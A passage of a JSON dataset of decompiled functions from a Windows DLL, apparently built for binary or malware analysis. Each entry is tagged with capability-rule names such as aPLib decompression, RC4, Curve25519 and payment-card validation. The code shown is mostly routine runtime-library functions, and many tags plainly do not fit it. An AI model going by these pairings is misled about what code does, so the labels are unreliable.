        "decompiled_code": "\nuint64_t fcn.180017280(uint64_t arg1, ulong arg2)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    int64_t *piVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    int64_t arg3;\n    int64_t iVar12;\n    \n    uVar8 = 0;\n    uVar10 = 0;\n    if (arg1 == 0) {\n        puVar4 = fcn.18001293c();\n        *puVar4 = 0x16;\n        return 0xffffffffffffffff;\n    }\n    uVar5 = fcn.18001e414(arg1);\n    uVar11 = arg1;\n    if ((uVar5 == 0) || (uVar5 == arg1)) {\ncode_r0x00018001713b:\n        puVar4 = fcn.18001293c();\n        uVar10 = 0xffffffff;\n        *puVar4 = 0x16;\n    }\n    else {\n        iVar1 = *(uVar5 + 2);\n        if (*0x18002be60 == *0x18002be68) {\n            *0x18002be60 = fcn.180017190(*0x18002be60);\n        }\n        if (*0x18002be60 == NULL) {\n            if ((arg2 == 0) || (*0x18002be58 == 0)) {\n                if (iVar1 == 0) goto code_r0x000180017150;\n                if (*0x18002be58 != 0) {\ncode_r0x000180016f87:\n                    *0x18002be60 = fcn.180015438(1, 8);\n                    fcn.1800136b4(0);\n                    goto code_r0x000180016fa9;\n                }\n                *0x18002be58 = fcn.180015438(1, 8);\n                fcn.1800136b4(0);\n                if (*0x18002be58 != 0) {\n                    if (*0x18002be60 != NULL) goto code_r0x000180016fae;\n                    goto code_r0x000180016f87;\n                }\n            }\n            else {\n                iVar6 = fcn.180011688();\n                if (iVar6 == 0) goto code_r0x00018001713b;\n                if (*0x18002be60 == *0x18002be68) {\n                    *0x18002be60 = fcn.180017190(*0x18002be60);\n                }\ncode_r0x000180016fa9:\n                if (*0x18002be60 != NULL) goto code_r0x000180016fae;\n            }\n            uVar10 = 0xffffffff;\n        }\n        else {\ncode_r0x000180016fae:\n            piVar7 = *0x18002be60;\n            arg3 = uVar5 - arg1 >> 1;\n            iVar6 = **0x18002be60;\n            piVar9 = *0x18002be60;\n            while (iVar6 != 0) {\n                iVar3 = fcn.180015188(arg1, iVar6, arg3);\n                if ((iVar3 == 0) && ((*(*piVar9 + arg3 * 2) == 0x3d || (*(*piVar9 + arg3 * 2) == 0)))) {\n                    iVar6 = piVar9 - piVar7 >> 3;\n                    goto code_r0x000180017003;\n                }\n                piVar9 = piVar9 + 1;\n                iVar6 = *piVar9;\n            }\n            iVar6 = -(piVar9 - piVar7 >> 3);\ncode_r0x000180017003:\n            if ((-1 < iVar6) && (*piVar7 != 0)) {\n                fcn.1800136b4(piVar7[iVar6]);\n                if (iVar1 == 0) {\n                    for (; piVar7[iVar6] != 0; iVar6 = iVar6 + 1) {\n                        piVar7[iVar6] = piVar7[iVar6 + 1];\n                    }\n                    piVar7 = fcn.180017288(piVar7, iVar6, 8);\n                    fcn.1800136b4(0);\n                    if (piVar7 != NULL) {\n                        *0x18002be60 = piVar7;\n                    }\n                }\n                else {\n                    piVar7[iVar6] = arg1;\n                    uVar11 = uVar8;\n                }\ncode_r0x0001800170be:\n                if (arg2 != 0) {\n                    iVar6 = -1;\n                    do {\n                        iVar12 = iVar6;\n                        iVar6 = iVar12 + 1;\n                    } while (*(arg1 + iVar6 * 2) != 0);\n                    iVar12 = iVar12 + 3;\n                    iVar6 = fcn.180015438(iVar12, 2);\n                    if (iVar6 != 0) {\n                        iVar3 = fcn.180015120(iVar6, iVar12, arg1);\n                        if (iVar3 != 0) {\n                            fcn.1800109cc(0, 0, 0, 0, 0);\n                            pcVar2 = swi(3);\n                            uVar8 = (*pcVar2)();\n                            return uVar8;\n                        }\n                        uVar5 = iVar6 + (arg3 + 1) * 2;\n                        *(uVar5 - 2) = 0;\n                        iVar3 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar6, -(iVar1 != 0) & uVar5);\n                        if (iVar3 == 0) {\n                            puVar4 = fcn.18001293c();\n                            uVar8 = 0xffffffff;\n                            *puVar4 = 0x2a;\n                        }\n                    }\n                    fcn.1800136b4(iVar6);\n                }\n                goto code_r0x000180017152;\n            }\n            if (iVar1 != 0) {\n                uVar5 = -iVar6 + 2;\n                if ((-iVar6 <= uVar5) && (uVar5 < 0x1fffffffffffffff)) {\n                    piVar7 = fcn.180017288(piVar7, uVar5, 8);\n                    fcn.1800136b4(0);\n                    if (piVar7 != NULL) {\n                        piVar7[-iVar6] = arg1;\n                        piVar7[1 - iVar6] = 0;\n                        uVar11 = uVar8;\n                        *0x18002be60 = piVar7;\n                        goto code_r0x0001800170be;\n                    }\n                }\n                uVar10 = 0xffffffff;\n            }\n        }\n    }\ncode_r0x000180017150:\n    uVar8 = uVar10;\ncode_r0x000180017152:\n    fcn.1800136b4(uVar11);\n    return uVar8;\n}\n",
        "token_count": 1588
    },
    "18000ac4": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.18000ac40(uchar (*arg1) [16], ulong noname_1, uint64_t arg3)\n\n{\n    uchar (*pauVar1) [16];\n    uchar (*pauVar2) [16];\n    uint16_t uVar3;\n    uint64_t uVar5;\n    uchar auVar6 [12];\n    uint32_t uVar4;\n    uchar auVar7 [13];\n    uchar auVar8 [16];\n    uchar uVar9;\n    \n    uVar5 = noname_1 * 0x101010101010101;\n    uVar3 = uVar5;\n    uVar4 = uVar5;\n    if (arg3 < 0x11) {\n        uVar9 = uVar5;\n    // switch table (17 cases) at 0x18002f000\n        switch(*(arg3 * 4 + 0x18002f000) + 0x180000000) {\n        case 0x18000ad70:\n            *(arg1[-1] + arg3 + 1) = uVar5;\n        case 0x18000ad74:\n            *(arg1[-1] + arg3 + 9) = uVar4;\n        case 0x18000ad77:\n            *(arg1[-1] + arg3 + 0xd) = uVar3;\n        case 0x18000ad7b:\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x18000ad7e:\n            return arg1;\n        case 0x18000ad80:\n            *(arg1[-1] + arg3 + 4) = uVar5;\n        case 0x18000ad84:\n            *(arg1[-1] + arg3 + 0xc) = uVar4;\n            return arg1;\n        case 0x18000ad88:\n            *(arg1[-1] + arg3 + 7) = uVar5;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x18000ad90:\n            *(arg1[-1] + arg3 + 3) = uVar5;\n        case 0x18000ad94:\n            *(arg1[-1] + arg3 + 0xb) = uVar4;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x18000ada0:\n            *(arg1[-1] + arg3 + 2) = uVar5;\n        case 0x18000ada4:\n            *(arg1[-1] + arg3 + 10) = uVar4;\n        case 0x18000ada7:\n            *(arg1[-1] + arg3 + 0xe) = uVar3;\n            return arg1;\n        case 0x18000adac:\n            **arg1 = uVar5;\n            return arg1;\n        case 0x18000adb0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar9;\n            return arg1;\n        case 0x18000adc0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            return arg1;\n        case 0x18000adc8:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar5;\n            return arg1;\n        }\n    }\n    uVar9 = SUB141(ZEXT814(uVar5) >> 0x30, 0);\n    auVar7 = ZEXT813(uVar5);\n    auVar6 = ZEXT812(uVar5);\n    auVar8 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(SUB161(ZEXT816(uVar5) >> 0x38, 0), \n                                                                      CONCAT114(SUB151(ZEXT815(uVar5) >> 0x38, 0), \n                                                                                ZEXT814(uVar5))) >> 0x70, 0), \n                                                            CONCAT113(uVar9, auVar7)) >> 0x68, 0), \n                                                            CONCAT112(uVar9, auVar6)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar7 >> 0x28, 0), ZEXT811(uVar5))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar6 >> 0x28, 0), uVar5)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar7 >> 0x20, 0), uVar5)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar6 >> 0x20, 0), uVar5)) >>\n                                                            0x40, 0), (uVar5 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar5 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar5 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar5 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                 >> 0x18, 0), (uVar5 >> 8) << 0x10) >> 0x10, 0), \n                       uVar3 & 0xff | uVar3 << 8);\n    pauVar1 = arg1;\n    if (0x80 < arg3) {\n        if ((*0x18002bb7c & 2) != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                (*pauVar1)[0] = noname_1;\n                pauVar1 = *pauVar1 + 1;\n            }\n            return arg1;\n        }\n        *arg1 = auVar8;\n        pauVar1 = arg1[1] & 0xfffffffffffffff0;\n        arg3 = arg1 + (arg3 - pauVar1);\n        uVar5 = arg3 >> 7;\n        if (uVar5 != 0) {\n            if (*0x18002b018 < uVar5) {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n            else {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n        }\n    }\n    for (uVar5 = arg3 >> 4; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *pauVar1 = auVar8;\n        pauVar1 = pauVar1[1];\n    }\n    if ((arg3 & 0xf) != 0) {\n        *(pauVar1[-1] + (arg3 & 0xf)) = auVar8;\n    }\n    return arg1;\n}\n",
        "token_count": 1936
    },
    "18000afb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.18000afb8(void)\n\n{\n    if (*0x18002b030 != 0xffffffff) {\n        fcn.18000d0e4(*0x18002b030);\n        *0x18002b030 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 66
    },
    "18001354": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.18001354c(void)\n\n{\n    if (*0x18002b260 != 0xffffffff) {\n        fcn.1800176a8(*0x18002b260);\n        *0x18002b260 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 65
    },
    "180015e6": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.180015e6c(int64_t *arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    ulong uStackX24;\n    int64_t iStackX32;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack88 [16];\n    ulong uStack72;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_bp_10h;\n    \n    uVar9 = 0;\n    if (arg2 == NULL) {\n        puVar4 = fcn.18001293c();\n        *puVar4 = 0x16;\n        fcn.18001097c();\n        uVar5 = 0x16;\n    }\n    else {\n        *arg2 = 0;\n        iVar6 = *arg1;\n        auStack88 = ZEXT816(0);\n        uStack72 = 0;\n        while (iVar6 != 0) {\n            uStackX24 = CONCAT53(uStackX24._3_5_, 0x3f2a);\n            iVar6 = fcn.18001ba40(iVar6, &uStackX24);\n            if (iVar6 == 0) {\n                uVar2 = fcn.1800159d4(*arg1, 0, 0, auStack88);\n            }\n            else {\n                uVar2 = fcn.180015b5c(*arg1, iVar6, auStack88);\n            }\n            uVar5 = uVar2;\n            if (uVar2 != 0) {\n                goto code_r0x000180015969;\n            }\n            arg1 = arg1 + 1;\n            iVar6 = *arg1;\n        }\n        uStackX24 = 0;\n        iVar6 = (auStack88._8_8_ - auStack88._0_8_ >> 3) + 1;\n        uVar5 = (auStack88._8_8_ - auStack88._0_8_) + 7U >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar5 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        uVar10 = uVar9;\n        uVar11 = uVar9;\n        if (uVar5 != 0) {\n            do {\n                iVar7 = -1;\n                do {\n                    iVar7 = iVar7 + 1;\n                } while (*(*piVar8 + iVar7) != '\\0');\n                piVar8 = piVar8 + 1;\n                uVar11 = uVar11 + 1 + iVar7;\n                uVar10 = uVar10 + 1;\n                uStackX24 = uVar11;\n            } while (uVar10 != uVar5);\n        }\n        iVar7 = fcn.180011080(iVar6, uStackX24);\n        uVar5 = 0xffffffffffffffff;\n        if (iVar7 != 0) {\n            iVar6 = iVar7 + iVar6 * 8;\n            iStackX32 = iVar6;\n            if (auStack88._0_8_ != auStack88._8_8_) {\n                piVar8 = auStack88._0_8_;\n                do {\n                    iVar12 = -1;\n                    do {\n                        iVar13 = iVar12;\n                        iVar12 = iVar13 + 1;\n                    } while (*(*piVar8 + iVar12) != '\\0');\n                    iVar13 = iVar13 + 2;\n                    iVar3 = fcn.18001b8c0(iStackX32, (iVar6 - iStackX32) + uStackX24, *piVar8, iVar13);\n                    if (iVar3 != 0) {\n                        fcn.1800109cc(0, 0, 0, 0, 0);\n                        pcVar1 = swi(3);\n                        uVar9 = (*pcVar1)();\n                        return uVar9;\n                    }\n                    *((iVar7 - auStack88._0_8_) + piVar8) = iStackX32;\n                    iStackX32 = iStackX32 + iVar13;\n                    piVar8 = piVar8 + 1;\n                } while (piVar8 != auStack88._8_8_);\n            }\n            *arg2 = iVar7;\n            uVar5 = uVar9;\n        }\n        fcn.1800136b4(0);\ncode_r0x000180015969:\n        uVar10 = auStack88._8_8_ + (7 - auStack88._0_8_) >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar10 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        if (uVar10 != 0) {\n            do {\n                fcn.1800136b4(*piVar8);\n                uVar9 = uVar9 + 1;\n                piVar8 = piVar8 + 1;\n            } while (uVar9 != uVar10);\n        }\n        fcn.1800136b4(auStack88._0_8_);\n        uVar5 = uVar5 & 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 1361
    },
    "1800129f": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint64_t fcn.1800129f8(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    int64_t iStackX32;\n    \n    iVar4 = fcn.1800180ec(arg1 & 0xffffffff);\n    if (iVar4 == -1) {\n        puVar5 = fcn.18001293c();\n        *puVar5 = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(iVar4, arg2, &iStackX32, arg3);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.1800128cc(uVar3);\n        }\n        else if (iStackX32 != -1) {\n            puVar1 = *((arg1 >> 6) * 8 + 0x18002bec0) + 0x38 + (arg1 & 0x3f) * 0x48;\n            *puVar1 = *puVar1 & 0xfd;\n            return iStackX32;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 292
    },
    "18001732": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.180017320(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    uVar7 = arg1;\n    uVar6 = *0x18002b028 ^ *(uVar7 * 8 + 0x18002c620);\n    uVar3 = *0x18002b028 & 0x3f;\n    uVar6 = uVar6 >> uVar3 | uVar6 << 0x40 - uVar3;\n    if (uVar6 != 0xffffffffffffffff) {\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        if (arg3 != arg4) {\n            do {\n                uVar6 = *arg3;\n                iVar5 = *(uVar6 * 8 + 0x18002c580);\n                if (iVar5 == 0) {\n                    arg1_00 = *(uVar6 * 8 + 0x180021b70);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0);\n                    if (iVar5 == 0) {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (((iVar4 == 0x57) && (iVar4 = fcn.180012858(arg1_00, L\"api-ms-\", 7),  iVar4 != 0)) &&\n                           (iVar4 = fcn.180012858(arg1_00, L\"ext-ms-\", 7),  iVar4 != 0)) {\n                            iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0, 0);\n                        }\n                        else {\n                            iVar5 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        piVar1 = uVar6 * 8 + 0x18002c580;\n                        iVar2 = *piVar1;\n                        *piVar1 = iVar5;\n                        if (iVar2 != 0) {\n                            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n                        }\n                        goto code_r0x000180017452;\n                    }\n                    *(uVar6 * 8 + 0x18002c580) = 0xffffffffffffffff;\n                }\n                else if (iVar5 != -1) {\ncode_r0x000180017452:\n                    if (iVar5 != 0) goto code_r0x00018001746d;\n                }\n                arg3 = arg3 + 1;\n            } while (arg3 != arg4);\n        }\n        iVar5 = 0;\ncode_r0x00018001746d:\n        if ((iVar5 != 0) && (uVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, arg2),  uVar6 != 0)) {\n            uVar3 = 0x40 - (*0x18002b028 & 0x3f) & 0x3f;\n            *(uVar7 * 8 + 0x18002c620) = (uVar6 >> uVar3 | uVar6 << 0x40 - uVar3) ^ *0x18002b028;\n            return uVar6;\n        }\n        uVar3 = 0x40 - (*0x18002b028 & 0x3f) & 0x3f;\n        *(uVar7 * 8 + 0x18002c620) = (0xffffffffffffffffU >> uVar3 | -1 << 0x40 - uVar3) ^ *0x18002b028;\n    }\n    return 0;\n}\n",
        "token_count": 864
    },
    "180017a7": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.180017a78(ulong noname_0, uint32_t *arg2, ulong noname_2, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    fcn.180015310(*arg2);\n    uVar1 = *0x18002b028 & 0x3f;\n    uVar2 = *0x18002b028 ^ *0x18002c748;\n    fcn.180015364(*arg4);\n    return uVar2 >> uVar1 | uVar2 << 0x40 - uVar1;\n}\n",
        "token_count": 142
    },
    "180017fe": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.180017fe0(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180018000. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((arg1 >> 6) * 8 + 0x18002bec0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 101
    },
    "18001800": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.180018008(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180018028. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((arg1 >> 6) * 8 + 0x18002bec0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 101
    },
    "180012ba": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012ba4(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180012ba8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 75
    },
    "180012bb": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012bb0(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180012bb4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 76
    },
    "18000316": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003160(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.1800030f0(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 51
    },
    "1800031a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800031a0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.180003160(arg1, 0xffffffffffffffff, arg2, arg3);\n    return;\n}\n",
        "token_count": 53
    },
    "1800031f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.1800031f0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    uVar1 = fcn.1800031a0(arg1, arg2, 0, &uStackX24);\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "1800032c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800032c0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.180003240(arg1, 0xffffffffffffffff, arg2, arg3);\n    return;\n}\n",
        "token_count": 53
    },
    "18000331": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.180003310(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    uVar1 = fcn.1800032c0(arg1, arg2, 0, &uStackX24);\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "18000336": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003360(ulong arg1, ulong arg2)\n\n{\n    fcn.18000a39c(arg1, arg2);\n    return;\n}\n",
        "token_count": 37
    },
    "18000339": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003390(ulong arg1, ulong arg2)\n\n{\n    fcn.18000a6e4(arg1, arg2);\n    return;\n}\n",
        "token_count": 38
    },
    "18000347": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003470(code **arg1)\n\n{\n    *arg1 = vtable.std::exception.0;\n    fcn.18000a374(arg1 + 1);\n    return;\n}\n",
        "token_count": 45
    },
    "1800035a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800035a0(ulong arg1)\n\n{\n    fcn.180003470(arg1);\n    return;\n}\n",
        "token_count": 30
    },
    "1800035c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.1800035c0(code **arg1)\n\n{\n    fcn.180003520(arg1, \"bad array new length\");\n    *arg1 = vtable.std::bad_array_new_length.0;\n    return arg1;\n}\n",
        "token_count": 55
    },
    "18000364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003640(ulong arg1)\n\n{\n    fcn.1800035a0(arg1);\n    return;\n}\n",
        "token_count": 30
    },
    "18000366": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003660(void)\n\n{\n    uchar auStack40 [40];\n    \n    fcn.1800035c0(auStack40);\n    fcn.18000ab68(auStack40, 0x180029a80);\n    return;\n}\n",
        "token_count": 59
    },
    "1800036d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.1800036d0(code **arg1, ulong arg2)\n\n{\n    fcn.180003410(arg1, arg2);\n    *arg1 = vtable.std::bad_alloc.0;\n    return arg1;\n}\n",
        "token_count": 54
    },
    "18000372": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003720(ulong arg1)\n\n{\n    fcn.180008dac(arg1);\n    return;\n}\n",
        "token_count": 28
    },
    "18000374": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180003740(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    \n    *arg2 = *arg2 + 0x27;\n    iVar1 = *(*arg1 + -8);\n    uVar2 = *arg1 - iVar1;\n    if ((uVar2 < 8) || (0x27 < uVar2)) {\n        fcn.18001099c();\n    }\n    *arg1 = iVar1;\n    return;\n}\n",
        "token_count": 120
    },
    "18000384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.180003840(uint8_t param_1)\n\n{\n    int32_t iVar1;\n    uchar uStack24;\n    \n    iVar1 = fcn.18000dde0(param_1);\n    if (((iVar1 == 0) && (param_1 != 0x2b)) && (param_1 != 0x2f)) {\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = 1;\n    }\n    return uStack24;\n}\n",
        "token_count": 109
    },
    "180003f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.180003f30(int64_t arg1, ulong arg2, int64_t arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack24;\n    \n    uVar1 = (arg2 - 2U) / 2;\n    for (uStack24 = 0; uStack24 < uVar1; uStack24 = uStack24 + 1) {\n        *(arg3 + uStack24) = (*(arg1 + uStack24 + uVar1) + -0x41) * '\\x1a' + -0x41 + *(arg1 + uStack24);\n    }\n    *arg4 = uVar1;\n    return;\n}\n",
        "token_count": 160
    },
    "18000475": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180004750(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.18000da3c();\n    do {\n        uVar2 = fcn.18000da3c();\n    } while (uVar2 < iVar1 + arg1);\n    return;\n}\n",
        "token_count": 78
    },
    "180005b4": {
        "rules": [
